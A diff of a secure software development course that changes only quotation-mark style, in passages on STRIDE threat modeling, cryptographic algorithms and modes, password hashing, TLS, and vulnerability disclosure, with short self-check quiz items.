 **STRIDE Threat Categories**, retrieved from [SEI](https://insights.sei.cmu.edu/sei_blog/2018/12/threat-modeling-12-available-methods.html), originally from Microsoft
 
-Notice that "STRIDE" is simply an acronym for the threats being considered: Spoofing, Tampering, Repudiation, Information disclosure, Denial of Service, and Elevation of privilege.
+Notice that “STRIDE” is simply an acronym for the threats being considered: Spoofing, Tampering, Repudiation, Information disclosure, Denial of Service, and Elevation of privilege.
 
 STRIDE is one of the oldest, most well-known, and simplest forms of threat modeling ([*Threat Modeling: Uncover Security Design Flaws Using the STRIDE Approach*](https://web.archive.org/web/20070303103639/http://msdn.microsoft.com/msdnmag/issues/06/11/ThreatModeling/default.aspx), by Shawn Hernan, Scott Lambert, Tomasz Ostwald, and Adam Shostack, 2006). There are tools you can use that are designed to support STRIDE; you can also use STRIDE with basic tools such as a drawing tool, word processor, and/or spreadsheet.
 
@@ -3667,7 +3667,7 @@ Threat modeling is overkill if you do not have significant security threats, and
 
 [x] For STRIDE, similar elements in the design are usually collapsed into one element as long as they don’t cross a trust boundary.
 
-[ ] The point of STRIDE is to examine each design element to see if there as a threat of information disclosure or tampering with data. {{ selected: No, that is only part of the story. Yes, you should consider information disclosure (violating confidentiality) and tampering with data (violating integrity). But those are just the "I" and “T” of STRIDE. You should also consider spoofing of identity, repudiation, denial of service, and elevation of privilege. }}
+[ ] The point of STRIDE is to examine each design element to see if there as a threat of information disclosure or tampering with data. {{ selected: No, that is only part of the story. Yes, you should consider information disclosure (violating confidentiality) and tampering with data (violating integrity). But those are just the “I” and “T” of STRIDE. You should also consider spoofing of identity, repudiation, denial of service, and elevation of privilege. }}
 
 # 3. Cryptography
 
@@ -3695,7 +3695,7 @@ Learning objectives:
 
 ### Introduction to Cryptography
 
-The word *cryptography* comes from the Greek phrase for "secret writing". Cryptography is the science or art of transforming intelligible form, and its reverse. However, many people attack cryptographic systems; cryptanalysis is the science or art of undoing a cryptographic transformation without the exact knowledge of how it was done.
+The word *cryptography* comes from the Greek phrase for “secret writing”. Cryptography is the science or art of transforming intelligible form, and its reverse. However, many people attack cryptographic systems; cryptanalysis is the science or art of undoing a cryptographic transformation without the exact knowledge of how it was done.
 
 Cryptography provides a set of tools that can sometimes help develop secure software. Cryptography *cannot* solve all security problems. In fact, most computer security vulnerabilities have nothing to do with cryptography.
 
@@ -3727,7 +3727,7 @@ The following sections will identify some key algorithms and protocols, and some
 
 ### Symmetric/Shared Key Encryption Algorithms
 
-A *symmetric key* or *shared key* encryption algorithm takes data (called "cleartext") and a key as input, and produces encrypted data (called “ciphertext”). It can also go the other way: using the ciphertext and the same key, it can produce the corresponding cleartext.
+A *symmetric key* or *shared key* encryption algorithm takes data (called “cleartext”) and a key as input, and produces encrypted data (called “ciphertext”). It can also go the other way: using the ciphertext and the same key, it can produce the corresponding cleartext.
 
 What is important about symmetric key encryption algorithms is that the *same* key is used to both encrypt and decrypt the data. So if you want people to be able to decrypt some ciphertext encrypted this way, you have to arrange for them to get the key. Most modern symmetric key algorithms are extremely fast (they are often hardware-accelerated), and they form the basis of many cryptographic systems.
 
@@ -3753,11 +3753,11 @@ Many symmetric key algorithms, including AES, are what is called *block algorith
 
 **Never use Electronic Code Book (ECB) mode!**
 
-The ECB mode is basically a debug or test mode for testing cryptographic algorithms. In ECB mode, the same block of data will produce the same encryption result. This is disastrous for an encryption algorithm, because it reveals far too much about the data that is supposed to be encrypted. A great illustration of this is the so-called "ECB Penguin" image; this image is encrypted using an ECB mode. Encrypted images should appear as random noise, but because ECB mode is used, in the ECB Penguin the image of Tux the Penguin is clearly visible.
+The ECB mode is basically a debug or test mode for testing cryptographic algorithms. In ECB mode, the same block of data will produce the same encryption result. This is disastrous for an encryption algorithm, because it reveals far too much about the data that is supposed to be encrypted. A great illustration of this is the so-called “ECB Penguin” image; this image is encrypted using an ECB mode. Encrypted images should appear as random noise, but because ECB mode is used, in the ECB Penguin the image of Tux the Penguin is clearly visible.
 
 ![The ECB Penguin: A dark encrypted image that clearly shows the Linux mascot, Tux the Penguin](ecb_penguin.png)
 
-The ECB Penguin, by Filippo Valsorda, retrieved from [filippo.io](https://blog.filippo.io/the-ecb-penguin/). Licensed under [CC BY-SA 4.0 International](https://creativecommons.org/licenses/by/4.0/legalcode). This image was inspired by the original lower-resolution ECB Penguin image by Wikipedia User: Lunkwill. Source "The ECB Penguin" (2013-11-10). Based on the Tux the penguin official Linux mascot created by Larry Ewing in 1996
+The ECB Penguin, by Filippo Valsorda, retrieved from [filippo.io](https://blog.filippo.io/the-ecb-penguin/). Licensed under [CC BY-SA 4.0 International](https://creativecommons.org/licenses/by/4.0/legalcode). This image was inspired by the original lower-resolution ECB Penguin image by Wikipedia User: Lunkwill. Source “The ECB Penguin” (2013-11-10). Based on the Tux the penguin official Linux mascot created by Larry Ewing in 1996
 
 Historically the *Cipher block chaining* (CBC) mode was used, but this must be calculated sequentially, so it is slow on multi-core systems. Another problem is that many systems that use CBC are vulnerable to attacks unless they are integrity-checked first. So in general, it is best to avoid CBC mode today ([Microsoft CBC Documentation](https://docs.microsoft.com/en-us/dotnet/standard/security/vulnerabilities-cbc-mode), 2020).
 
@@ -3769,7 +3769,7 @@ A common mode used today is the Galois/Counter Mode (GCM). It is fast, paralleli
 
 [!x] The Advanced Encryption Standard (AES) supports 3 key sizes: 128, 192, or 256 bits.
 
-[ ] Triple-DES (3DES) is a secure encryption algorithm to use for large amounts of data. {{ selected: This is incorrect. 3DES has an internal block size of only 64 bits, and that makes it vulnerable to a "birthday attack" if significant amounts of data are encrypted with the same key. 3DES is much better than DES by itself, since 3DES has a longer key size, but you should normally use something else like AES where you can. }}
+[ ] Triple-DES (3DES) is a secure encryption algorithm to use for large amounts of data. {{ selected: This is incorrect. 3DES has an internal block size of only 64 bits, and that makes it vulnerable to a “birthday attack” if significant amounts of data are encrypted with the same key. 3DES is much better than DES by itself, since 3DES has a longer key size, but you should normally use something else like AES where you can. }}
 
 [ ] You should use the Electronic Code Book (ECB) mode of encryption algorithms, since that enables reproducibility.
 
@@ -3785,7 +3785,7 @@ Some programs need a one-way cryptographic hash algorithm, that is, a function t
 
 3. Any two messages with the same hash (*collision resistance*).
 
-The idea is that you can represent an arbitrary amount of data with a smaller value of fixed length. They are "*one-way*" in the sense that you cannot generally recreate the original data given only the hash value. Cryptographic hashes are useful by themselves, and they are also often used as part of larger cryptographic systems.
+The idea is that you can represent an arbitrary amount of data with a smaller value of fixed length. They are “*one-way*” in the sense that you cannot generally recreate the original data given only the hash value. Cryptographic hashes are useful by themselves, and they are also often used as part of larger cryptographic systems.
 
 You should avoid the algorithms MD4, MD5, and SHA-0, as these are known to be broken.
 
@@ -3795,7 +3795,7 @@ The SHA-1 algorithm is a slightly more complicated case. You should not use it i
 
 However, one annoying problem is that the widely-used git tool (as originally developed) fundamentally depends on SHA-1. The currently-known breaks in SHA-1 don’t matter for common situations. In addition, as of 2020, git uses a hardened variant of SHA-1 that counters the main problems with SHA-1 as it is used within git. However, attacks only get stronger, not weaker, leading to many concerns about the use of SHA-1 in git.
 
-As of this writing, there is an effort to update git so it will support a different cryptographic hash algorithm, specifically SHA-256. This has been complicated because git was not originally designed to support another cryptographic hash algorithm ([A new hash algorithm for Git](https://lwn.net/Articles/811068/), by Jonathan Corbet, 2020). As noted in LWN.net, *"one of the reasons this transition has been so hard is that the original Git implementation was not designed to swap out hashing algorithms. Much of the work to [implement SHA-256 in git] has been walking back this initial design flaw [to make] Git fundamentally indifferent to the hashing algorithm used. This [work] should make Git more adaptable in the future should the need to replace SHA-256 with something stronger arise"* ([Updating the Git protocol for SHA-256](https://lwn.net/Articles/823352/), by John Coggeshall, 2020).
+As of this writing, there is an effort to update git so it will support a different cryptographic hash algorithm, specifically SHA-256. This has been complicated because git was not originally designed to support another cryptographic hash algorithm ([A new hash algorithm for Git](https://lwn.net/Articles/811068/), by Jonathan Corbet, 2020). As noted in LWN.net, *“one of the reasons this transition has been so hard is that the original Git implementation was not designed to swap out hashing algorithms. Much of the work to [implement SHA-256 in git] has been walking back this initial design flaw [to make] Git fundamentally indifferent to the hashing algorithm used. This [work] should make Git more adaptable in the future should the need to replace SHA-256 with something stronger arise”* ([Updating the Git protocol for SHA-256](https://lwn.net/Articles/823352/), by John Coggeshall, 2020).
 
 This may be resolved in git by the time you read this. However, the main point is to learn from this mistake. As noted earlier, cryptographic systems (such as algorithms and protocols) *are* occasionally broken, so you must be prepared to replace them.
 
@@ -3803,7 +3803,7 @@ This may be resolved in git by the time you read this. However, the main point i
 
 \>\>Select the true statement(s):<<
 
-[!x] In a secure one-way cryptographic hash algorithm, it should be infeasible, given one message, to create another message that has the same hash value {{ selected: This is true, this is "preimage resistance" }}
+[!x] In a secure one-way cryptographic hash algorithm, it should be infeasible, given one message, to create another message that has the same hash value {{ selected: This is true, this is “preimage resistance” }}
 
 [x] SHA-1 no longer meets the full criteria for a one-way cryptographic hash function, so in general you should shift to another algorithm, such as the SHA-2 or SHA-3 family.
 
@@ -3821,7 +3821,7 @@ These algorithms can be used in one or more ways (depending on the algorithm), i
 
 * **Key exchange**<br>There are public key algorithms that enable two parties to end up with a shared key without outside passive observers being able to determine the key.
 
-A widely-used public key algorithm is the RSA algorithm, which *can* be used for all these purposes. However, *do not implement RSA yourself*. RSA is fundamentally based on exponentiation of large numbers, which lures some developers into implementing it themselves or thinking it is simple. In practice it is extremely easy to implement RSA *insecurely*. For example, it is very difficult to check for weak parameters that *look* acceptable but make it trivial to defeat. To be secure, RSA *must* be implemented with something called "padding". There is a standard RSA padding scheme with a rigorous proof called OAEP, but it is difficult to implement correctly (incorrect implementations may be vulnerable to *Manger’s attack*). In practice, RSA can be tricky to apply correctly, and unless you understand cryptography, you won’t be able to tell when it is not working ([*Seriously, stop using RSA*](https://blog.trailofbits.com/2019/07/08/fuck-rsa/), 2019).
+A widely-used public key algorithm is the RSA algorithm, which *can* be used for all these purposes. However, *do not implement RSA yourself*. RSA is fundamentally based on exponentiation of large numbers, which lures some developers into implementing it themselves or thinking it is simple. In practice it is extremely easy to implement RSA *insecurely*. For example, it is very difficult to check for weak parameters that *look* acceptable but make it trivial to defeat. To be secure, RSA *must* be implemented with something called “padding”. There is a standard RSA padding scheme with a rigorous proof called OAEP, but it is difficult to implement correctly (incorrect implementations may be vulnerable to *Manger’s attack*). In practice, RSA can be tricky to apply correctly, and unless you understand cryptography, you won’t be able to tell when it is not working ([*Seriously, stop using RSA*](https://blog.trailofbits.com/2019/07/08/fuck-rsa/), 2019).
 
 RSA key lengths need to be longer than you might expect. An RSA key length of 1024 bits is approximately equivalent to a symmetric key length of 80 bits, which is so small that it is generally considered insecure. An RSA key length of 2048 bits is equivalent to a symmetric key length of 112 bits; a 2048 bit is considered barely acceptable by some (e.g., NIST says that this may be used through 2030, after which it may not be used by the US government). If you are using RSA, you should probably use at least 3,072 bit key in current deployments (this is equivalent to a 128 bit symmetric key). You would need an RSA key of 15,360 bits to get the equivalent of a 256-bit symmetric key. See [NIST’s *Recommendation for Key Management: Part 1 - General*](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-57pt1r5.pdf) for more about key equivalent lengths. Unfortunately, RSA is relatively slow, especially as you increase to key lengths necessary for minimum security. For all these reasons, some organizations, such as Trail of Bits, recommend avoiding using RSA in most cases ([*Seriously, stop using RSA*](https://blog.trailofbits.com/2019/07/08/fuck-rsa/), 2019).
 
@@ -3847,9 +3847,9 @@ As hinted at earlier, it is critical that you use existing well-respected implem
 
 Many algorithms depend on secret values that cannot be practically guessed by an attacker. This includes values used by cryptography algorithms (such as nonces), session ids, and many other values. If an attacker can guess a value, including past or future values, many systems become insecure.
 
-One challenge is historical: today, the name *random* in programming language libraries usually implies that the function is *not* cryptographically secure. One of the first uses for digital computers was to implement simulations (especially *Monte Carlo simulations*) where random numbers were repeatedly acquired for a simulation. It was often important to be able to *reconstruct* these random numbers so experiments could be repeated. Internally, such random functions would be implemented using algorithms such as a linear congruential generator (LCG), and would often be "seeded" (initialized) by values such as a date/time that can be trivially guessed by an attacker. Because this was one of the first uses of computers, there is a convention across almost all programming languages that the word “random” refers to a way to create a sequence of numbers that could be easily reconstructed later if needed. In other words, the word “random” in programming languages typically implies “*predictably random*”, and that is not what you want in cryptography. Such random numbers *must not* be used for security mechanisms where it is important that an attacker *not* be able to determine the number.
+One challenge is historical: today, the name *random* in programming language libraries usually implies that the function is *not* cryptographically secure. One of the first uses for digital computers was to implement simulations (especially *Monte Carlo simulations*) where random numbers were repeatedly acquired for a simulation. It was often important to be able to *reconstruct* these random numbers so experiments could be repeated. Internally, such random functions would be implemented using algorithms such as a linear congruential generator (LCG), and would often be “seeded” (initialized) by values such as a date/time that can be trivially guessed by an attacker. Because this was one of the first uses of computers, there is a convention across almost all programming languages that the word “random” refers to a way to create a sequence of numbers that could be easily reconstructed later if needed. In other words, the word “random” in programming languages typically implies “*predictably random*”, and that is not what you want in cryptography. Such random numbers *must not* be used for security mechanisms where it is important that an attacker *not* be able to determine the number.
 
-Instead, for almost all security-related tasks you need to use a cryptographically secure PRNG (CSPRNG) for crypto and security-related tasks, as these are not easily predicted. You should *only* use random number generators for security purposes if it says it is a *cryptographic PRNG* - and typically its name will have "secure" and/or “crypto” in it. In their documentation, you may see references to well-accepted cryptographic PRNG algorithms such as Yarrow, Fortuna, ANSI X9.17 (which can use any block cipher), NIST SP 800-90A’s Hash_DRBG, HMAC_DRBG, and CTR_DRBG. 
+Instead, for almost all security-related tasks you need to use a cryptographically secure PRNG (CSPRNG) for crypto and security-related tasks, as these are not easily predicted. You should *only* use random number generators for security purposes if it says it is a *cryptographic PRNG* - and typically its name will have “secure” and/or “crypto” in it. In their documentation, you may see references to well-accepted cryptographic PRNG algorithms such as Yarrow, Fortuna, ANSI X9.17 (which can use any block cipher), NIST SP 800-90A’s Hash_DRBG, HMAC_DRBG, and CTR_DRBG. 
 
 **🚩 Never use the algorithm Dual_EC_DRBG, as it is widely accepted that this is a subverted and insecure algorithm.**
 
@@ -3894,9 +3894,9 @@ A particularly nasty security problem in computer systems is *subverted random n
 
 \>\>Select the true statement(s):<<
 
-[!x] In many programming languages, a cryptographically secure random number generator will have "secure" or “crypto” in its name.
+[!x] In many programming languages, a cryptographically secure random number generator will have “secure” or “crypto” in its name.
 
-[x] In many programming languages, a function/method with the name "random" but no other indicator is typically a predictable random number and should not be used for security.
+[x] In many programming languages, a function/method with the name “random” but no other indicator is typically a predictable random number and should not be used for security.
 
 [ ] It is easy to tell if a cryptographic PRNG is subverted.
 
@@ -3914,13 +3914,13 @@ If you implement option 3, supporting a password-based login (at least in part),
 
 **Beware** of storing passwords in an insecure way. A database full of password information is a tempting target for attackers. In practice, many attackers have managed to gain databases of password-related information (e.g., by breaking into the service or acquiring a backup). A secure system *must* be designed so that attackers cannot easily exploit server-side password databases, even when attackers manage to retrieve a copy. Here are some approaches that do **NOT** work:
 
-* Storing passwords "in the clear" (unencrypted). Obviously, if an attacker gets this data, the attacker can use all the passwords. **_Don’t do this!_**
+* Storing passwords “in the clear” (unencrypted). Obviously, if an attacker gets this data, the attacker can use all the passwords. **_Don’t do this!_**
 
 * Hashing the passwords (e.g., with SHA-256). Attackers have tools that can brute-force guess billions of passwords, hash them all, and compare them with the hashed values, so this does not protect the passwords. **_Don’t do this!_**
 
-* Per-user salted hashes. This combines the password with a random per-user value called a "salt", then hashes the combination. The problem is that modern hash algorithms are so fast that attackers can still guess billions of passwords and often find a user’s password. Again, **_don’t do this!_**
+* Per-user salted hashes. This combines the password with a random per-user value called a “salt”, then hashes the combination. The problem is that modern hash algorithms are so fast that attackers can still guess billions of passwords and often find a user’s password. Again, **_don’t do this!_**
 
-If you are using passwords for inbound authentication, for security you **_must_** use a special kind of algorithm for this purpose called an *iterated per-user salted cryptographic hash* algorithm. The term "iterated" is also called key derivation. Three algorithms are commonly used as an iterated per-user salted cryptographic hash algorithm:
+If you are using passwords for inbound authentication, for security you **_must_** use a special kind of algorithm for this purpose called an *iterated per-user salted cryptographic hash* algorithm. The term “iterated” is also called key derivation. Three algorithms are commonly used as an iterated per-user salted cryptographic hash algorithm:
 
 * **Argon2id**<br>Unless you have a strong reason to use something else, this is the algorithm to use today. It is relatively strong against both software and hardware-based attacks.
 
@@ -3984,17 +3984,17 @@ Once you have deployed your system, you should test it. If the site is publicly 
 
 [!] If you are invoking a TLS library, it is reasonable to assume that it fully verifies the server’s TLS certificate automatically. {{ selected: Not so. Many libraries do *not* fully verify it, e.g., they might not verify that the certificate is appropriate for a given system. Some do, but when using a TLS library you have not used before, it is important to check what it verifies. }}
 
-[x] Web browsers use TLS or SSL when connecting to an external site with an "**https:**" URL.
+[x] Web browsers use TLS or SSL when connecting to an external site with an “**https:**” URL.
 
 [x] When web browsers contact a server with TLS, they use a configurable set of certificate authority public keys (either included with the browser or provided via the operating system).
 
-[x] Recommended HTTPS server settings can be found at Mozilla’s "Security/Server Side TLS" site.
+[x] Recommended HTTPS server settings can be found at Mozilla’s “Security/Server Side TLS” site.
 
 ### Other Topics in Cryptography
 
 #### Getting Cryptographic Advice
 
-In this course, we have tried to give some basics and enough information to apply them in various circumstances. Perhaps most important, however, are the key pieces of advice: do not create your own cryptographic algorithms or protocols, and do not create your own implementations. Instead, reuse well-respected algorithms, protocols, and implementations. When configuring cryptography, look for current well-respected advice. Examples of such sources include Mozilla’s [Security/Server Side TLS site](https://wiki.mozilla.org/Security/Server_Side_TLS), NIST (especially NIST’s [*Recommendation for Key Management: Part 1 - General*](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-57pt1r5.pdf)), and CISCO’s [*Next Generation Cryptography*](https://tools.cisco.com/security/center/resources/next_generation_cryptography). Cryptographers won’t always agree on what is "best" (as with any other field), but experts will be able to point out what is clearly broken and what is widely agreed to be much safer.
+In this course, we have tried to give some basics and enough information to apply them in various circumstances. Perhaps most important, however, are the key pieces of advice: do not create your own cryptographic algorithms or protocols, and do not create your own implementations. Instead, reuse well-respected algorithms, protocols, and implementations. When configuring cryptography, look for current well-respected advice. Examples of such sources include Mozilla’s [Security/Server Side TLS site](https://wiki.mozilla.org/Security/Server_Side_TLS), NIST (especially NIST’s [*Recommendation for Key Management: Part 1 - General*](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-57pt1r5.pdf)), and CISCO’s [*Next Generation Cryptography*](https://tools.cisco.com/security/center/resources/next_generation_cryptography). Cryptographers won’t always agree on what is “best” (as with any other field), but experts will be able to point out what is clearly broken and what is widely agreed to be much safer.
 
 #### Constant Time Algorithms
 
@@ -4002,7 +4002,7 @@ There is an important topic that we have not mentioned yet: constant-time algori
 
 Those who develop cryptographic libraries must implement their algorithms so that the time they take does not vary based on their input data (this is non-trivial, though possible, with AES). Most developers are never taught how to do this, so this is one of many reasons you should not write your own cryptographic library. However, there is a variation that can often happen outside of these libraries: sometimes you have to handle array comparisons specially.
 
-The normal comparison operations (such as **is-equal**) try to minimize execution time, and this can sometimes leak timing information about the values to attackers. If an attacker could repeatedly send in data and notice that a comparison of a value beginning with "0" takes longer than one that does not, then the first value it is compared to must be “0”. The attacker can then repeatedly guess the second digit, then the third, and so on. Many developers incorrectly believe that it is not possible for attackers to exploit timing variations over a network; this is a false belief attackers love to exploit. Modern statistics turns out to be remarkably powerful for removing latency variances; attackers really *can* exploit these latencies.
+The normal comparison operations (such as **is-equal**) try to minimize execution time, and this can sometimes leak timing information about the values to attackers. If an attacker could repeatedly send in data and notice that a comparison of a value beginning with “0” takes longer than one that does not, then the first value it is compared to must be “0”. The attacker can then repeatedly guess the second digit, then the third, and so on. Many developers incorrectly believe that it is not possible for attackers to exploit timing variations over a network; this is a false belief attackers love to exploit. Modern statistics turns out to be remarkably powerful for removing latency variances; attackers really *can* exploit these latencies.
 
 *Constant-time comparisons* are comparisons (usually equality) that take the same time no matter what data is provided to them. These are not the same as O(1) operations in computer science. Examples of these constant-time comparison functions are:
 
@@ -4022,7 +4022,7 @@ Remember that per least privilege, we want to minimize the time a privilege is a
 
 One of the large future unknowns in cryptography is the potential impact of general-purpose quantum computers. At the time of this writing, so-called *general-purpose* quantum computers exist, but they are not powerful enough to threaten current cryptographic algorithms. It is not known if such more powerful general-purpose quantum computers can be built, and if so, when that will happen. If strong general-purpose quantum computers are built, they have the potential to break all the public-key algorithms that are popular in 2020 by using an algorithm called *Shor’s algorithm*. As a result, researchers are developing new public-key algorithms that resist attacks from such quantum computers, an area called *post-quantum cryptography*. At the time of this writing, many such algorithms have been developed and are being evaluated.
 
-In contrast, current symmetric cryptographic algorithms and hash functions are less affected by quantum computers. Grover's algorithm speeds up attacks against symmetric ciphers, halving their effective length. That means that 128-bit AES could be broken by a quantum computer (it would then be equivalent to a 64-bit key today), but 256-bit AES would still be secure (it would be equivalent to a 128-bit key today). So simply using longer keys and hashes is expected to be adequate in a post-quantum world for symmetric cryptographic algorithms and hash functions.
+In contrast, current symmetric cryptographic algorithms and hash functions are less affected by quantum computers. Grover’s algorithm speeds up attacks against symmetric ciphers, halving their effective length. That means that 128-bit AES could be broken by a quantum computer (it would then be equivalent to a 64-bit key today), but 256-bit AES would still be secure (it would be equivalent to a 128-bit key today). So simply using longer keys and hashes is expected to be adequate in a post-quantum world for symmetric cryptographic algorithms and hash functions.
 
 #### Humility Is Important in Cryptography
 
@@ -4040,7 +4040,7 @@ Similarly, seek advice from experts, and weigh that advice carefully. Errors in 
 
 [x] Where practical, you should minimize the time that normally-encrypted data is decrypted.
 
-[ ] If powerful "general-purpose" quantum computers are developed, they will render all encryption algorithms useless. {{ selected: No. Such computers will render useless common *public-key* algorithms that are popular in 2020. However, while they will halve the effective bit length of symmetric encryption algorithms, they will not render them useless; a 256-bit key for a symmetric encryption algorithm will effectively become a 128-bit key, which is still adequately secure for most purposes. In addition, new public-key algorithms are being developed that resist attacks from such quantum computers. }}
+[ ] If powerful “general-purpose” quantum computers are developed, they will render all encryption algorithms useless. {{ selected: No. Such computers will render useless common *public-key* algorithms that are popular in 2020. However, while they will halve the effective bit length of symmetric encryption algorithms, they will not render them useless; a 256-bit key for a symmetric encryption algorithm will effectively become a 128-bit key, which is still adequately secure for most purposes. In addition, new public-key algorithms are being developed that resist attacks from such quantum computers. }}
 
 # 4. Other Topics
 
@@ -4066,7 +4066,7 @@ Unfortunately, even after your best efforts, someone may find a vulnerability in
 
 #### Product Security Incident Response Teams (PSIRTs)
 
-If you are part of a team developing a large software application within a single organization, then you probably have or should consider forming a group to address security incidents related to that software. Such teams are sometimes called a Product Security Incident Response Team (PSIRT). The nonprofit Forum of Incident Response and Security Teams (FIRST) defines a PSIRT as *"an entity within an organization which... focuses on the identification, assessment and disposition of the risks associated with security vulnerabilities within the products, including offerings, solutions, components and/or services which an organization produces and/or sells"* ([FIRST](https://www.first.org/standards/frameworks/): *Product Security Incident Response Team (PSIRT) Services Framework* and *Computer Security Incident Response Team (CSIRT) Services Framework*). FIRST recommends that PSIRTs be formed while requirements are still being developed, but they should at least be formed before the initial release of the software. A properly-running PSIRT can identify and rapidly respond to an extremely serious vulnerability report.
+If you are part of a team developing a large software application within a single organization, then you probably have or should consider forming a group to address security incidents related to that software. Such teams are sometimes called a Product Security Incident Response Team (PSIRT). The nonprofit Forum of Incident Response and Security Teams (FIRST) defines a PSIRT as *“an entity within an organization which... focuses on the identification, assessment and disposition of the risks associated with security vulnerabilities within the products, including offerings, solutions, components and/or services which an organization produces and/or sells”* ([FIRST](https://www.first.org/standards/frameworks/): *Product Security Incident Response Team (PSIRT) Services Framework* and *Computer Security Incident Response Team (CSIRT) Services Framework*). FIRST recommends that PSIRTs be formed while requirements are still being developed, but they should at least be formed before the initial release of the software. A properly-running PSIRT can identify and rapidly respond to an extremely serious vulnerability report.
 
 PSIRTs often work with computer incident response teams (CSIRTs); a CSIRT is focused on the security of computer systems and/or networks that make up the infrastructure of an entire organization, while PSIRTs focus on specific products/services. Should you have one (or want to establish one), FIRST provides useful frameworks describing what PSIRTs and CSIRTs should do within an organization ([FIRST Services Framework](https://www.first.org/standards/frameworks/)).
 
@@ -4076,7 +4076,7 @@ A simple short guide is the [OWASP Vulnerability Disclosure Cheat Sheet](https:/
 
 There are many other useful documents that discuss vulnerability disclosure. In particular:
 
-* [*The CERT Guide to Coordinated Vulnerability Disclosure*](https://vuls.cert.org/confluence/display/CVD/The+CERT+Guide+to+Coordinated+Vulnerability+Disclosure), by Allen Householder, 2019. In that document the "vendor" is the organization that releases the software and needs to learn about the security vulnerability.
+* [*The CERT Guide to Coordinated Vulnerability Disclosure*](https://vuls.cert.org/confluence/display/CVD/The+CERT+Guide+to+Coordinated+Vulnerability+Disclosure), by Allen Householder, 2019. In that document the “vendor” is the organization that releases the software and needs to learn about the security vulnerability.
 
 * FIRST’s [*Guidelines and Practices for Multi-Party Vulnerability Coordination and Disclosure*](https://www.first.org/global/sigs/vulnerability-coordination/multiparty/guidelines-v1.1) [https://www.first.org/global/sigs/vulnerability-coordination/multiparty/guidelines-v1.1](https://www.first.org/global/sigs/vulnerability-coordination/multiparty/guidelines-v1.1)
 
@@ -4114,11 +4114,11 @@ As we have already mentioned, monitor for vulnerabilities about your software an
 
 #### Consider Creating a Bug Bounty Program
 
-A widely-used technique to encourage vulnerability reporting is a *bug bounty program*, where you pay reporters to report about especially important defects. This can be a cost-effective way to encourage people to report vulnerabilities to you once all relatively "easy-to-find" vulnerabilities have been found and fixed. If you don’t want to manage such a program yourself, there are various companies that can do that for you for a fee.
+A widely-used technique to encourage vulnerability reporting is a *bug bounty program*, where you pay reporters to report about especially important defects. This can be a cost-effective way to encourage people to report vulnerabilities to you once all relatively “easy-to-find” vulnerabilities have been found and fixed. If you don’t want to manage such a program yourself, there are various companies that can do that for you for a fee.
 
-Be sure to clearly establish the scope and terms of any bug bounty programs ([OWASP Vulnerability Disclosure](https://cheatsheetseries.owasp.org/cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html)). Specify what you will pay for, including a minimum and maximum range. For example, *"$X-$Y for a vulnerability that directly leads to a remote code execution without requiring login credentials."* If there is a maximum that you can spend in a year, say so, and indicate the total amount, the calendar used, and what will happen to reports after the annual funding is used up. Also make it clear who is ineligible, e.g., developers of the software and/or employees of companies that develop the software.
+Be sure to clearly establish the scope and terms of any bug bounty programs ([OWASP Vulnerability Disclosure](https://cheatsheetseries.owasp.org/cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html)). Specify what you will pay for, including a minimum and maximum range. For example, *“$X-$Y for a vulnerability that directly leads to a remote code execution without requiring login credentials.”* If there is a maximum that you can spend in a year, say so, and indicate the total amount, the calendar used, and what will happen to reports after the annual funding is used up. Also make it clear who is ineligible, e.g., developers of the software and/or employees of companies that develop the software.
 
-However, beware: a bug bounty program can be an incredible waste of money unless the easy to find vulnerabilities are found and fixed first. As Katie Moussouris has noted, *"Not all bugs are created equal"*; many defects (such as most XSS defects) are easy to detect and fix, and *"you should be finding those bugs easily yourselves too."* Using a bug bounty program to find easy-to-find vulnerabilities is extremely costly and *“is not appropriate risk management.”* She even noted a case where a company ended up paying a security researcher $29,000/hour to find simple well-known defects. Find and fix the simple bugs first, and *then* a bug bounty program may make sense ([*Relying on bug bounties ‘not appropriate risk management’: Katie Moussouris*](https://www.zdnet.com/article/relying-on-bug-bounties-not-appropriate-risk-management-katie-moussouris/), by Stilgherrian, 2019).
+However, beware: a bug bounty program can be an incredible waste of money unless the easy to find vulnerabilities are found and fixed first. As Katie Moussouris has noted, *“Not all bugs are created equal"*; many defects (such as most XSS defects) are easy to detect and fix, and *“you should be finding those bugs easily yourselves too.”* Using a bug bounty program to find easy-to-find vulnerabilities is extremely costly and *“is not appropriate risk management.”* She even noted a case where a company ended up paying a security researcher $29,000/hour to find simple well-known defects. Find and fix the simple bugs first, and *then* a bug bounty program may make sense ([*Relying on bug bounties ‘not appropriate risk management’: Katie Moussouris*](https://www.zdnet.com/article/relying-on-bug-bounties-not-appropriate-risk-management-katie-moussouris/), by Stilgherrian, 2019).
 
 ### Respond To and Fix the Vulnerability in a Timely Way
 
@@ -4158,7 +4158,7 @@ FIRST developed a simple marking system for this called the [Traffic Light Proto
 
 2. In documents: the TLP color is in the header and footer of each page, typically right-justified.
 
-The TLP color is shown in all-caps after "**TLP:**", so you will see **TLP:RED**, **TLP:AMBER**, **TLP:GREEN**, or **TLP:WHITE**. These colors have the following meaning:
+The TLP color is shown in all-caps after “**TLP:**”, so you will see **TLP:RED**, **TLP:AMBER**, **TLP:GREEN**, or **TLP:WHITE**. These colors have the following meaning:
 
 * **TLP:RED** = Not for disclosure, restricted to participants only.
 
@@ -4176,15 +4176,15 @@ You should request a CVE where appropriate and it has not already been requested
 
 The reason for CVEs and CVSS is simple: organizations are overwhelmed with software updates, and they need information to help them prioritize updates. CVE and CVSS are not perfect, but they are widely used and depended on. The Ponemon Institute’s [*Costs and Consequences of Gaps in Vulnerability Responses*](https://www.servicenow.com/lpayr/ponemon-vulnerability-survey.html) (2019) survey found that:
 
-* *"Almost half of respondents (48%) report that their organizations had one or more data breaches in the past two years."*
+* *“Almost half of respondents (48%) report that their organizations had one or more data breaches in the past two years.”*
 
-* *"60% of breach victims said they were breached due to [a] known vulnerability where the patch was not applied"*
+* *“60% of breach victims said they were breached due to [a] known vulnerability where the patch was not applied”*
 
-* *"CVSS scoring… is often the only metric of patch prioritization [even though it] leaves out asset criticality and systems as part of vulnerability response."*
+* *“CVSS scoring… is often the only metric of patch prioritization [even though it] leaves out asset criticality and systems as part of vulnerability response.”*
 
-* *"44% of respondents say their organizations use automation to assist with vulnerability management and patching [(primarily prioritization and patching)]"*
+* *“44% of respondents say their organizations use automation to assist with vulnerability management and patching [(primarily prioritization and patching)]”*
 
